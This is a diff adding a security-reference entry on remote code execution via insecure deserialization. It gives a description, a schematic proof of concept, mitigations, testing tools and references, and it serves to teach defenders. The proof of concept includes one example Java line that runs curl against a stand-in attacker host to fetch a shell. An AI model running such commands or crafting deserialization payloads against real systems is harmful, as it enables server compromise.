@@ -5911,4 +5911,63 @@ This often leads to unauthorized access to sensitive operations such as administ
 - [PortSwigger - Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
 
 ***
+## PART VII 
+---
+INSECURE DESERIALIZATION 
 
+***
+## 🛡️ WebVuln #48: Remote Code Execution via Insecure Deserialization
+
+### 🗂️ Category
+Code Execution / Insecure Deserialization
+
+### 🐞 Vulnerability
+Remote Code Execution (RCE) via Insecure Deserialization
+
+### 📖 Description
+Insecure deserialization occurs when untrusted or user-controlled data is deserialized by an application without proper validation, allowing an attacker to manipulate serialized objects and inject malicious data. If the application deserializes objects that include executable code, it can lead to arbitrary remote code execution (RCE), privilege escalation, or denial of service (DoS).
+
+This vulnerability is especially critical in languages like Java, PHP, Python, and .NET, where deserialization can invoke class constructors, magic methods, or execute arbitrary code.
+
+### 💣 Demo / Proof of Concept
+
+1. A vulnerable endpoint expects serialized data:
+
+    ```http
+    POST /api/deserialize HTTP/1.1
+    Content-Type: application/octet-stream
+
+    <malicious serialized object>
+    ```
+
+2. The attacker crafts a serialized payload with a command execution gadget chain using a tool like `ysoserial`.
+
+3. Once submitted, the server deserializes the object and executes the embedded system command, e.g.,
+
+    ```java
+    Runtime.getRuntime().exec("curl attacker.com/shell");
+    ```
+
+### 🛡️ Mitigation
+- Avoid deserializing data from untrusted sources.
+- Use safe serialization formats like JSON or XML (without executable metadata).
+- Implement strict type checking and allowlisting of classes allowed for deserialization.
+- Use libraries that support safe deserialization or sandboxed execution.
+- Apply input validation before deserialization.
+- Monitor for signs of deserialization abuse (e.g., suspicious classes in memory or outbound connections).
+- In Java, disable dangerous features (e.g., `readObject`) and use serialization filters.
+
+### 🧪 Testing Tools / Techniques
+- Manual crafted payloads for known gadget chains.
+- `ysoserial` (Java), `PHPGGC` (PHP), or `Marshalsec` (Java) for payload generation.
+- Burp Suite for intercepting and modifying serialized requests.
+- OWASP ZAP for detecting deserialization issues.
+- Static code analysis to find deserialization calls on untrusted data.
+
+### 📚 References
+- [OWASP Insecure Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
+- [OWASP Top 10 - A08:2021 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
+- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
+- [PortSwigger - Deserialization Vulnerabilities](https://portswigger.net/web-security/deserialization)
+- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
+***
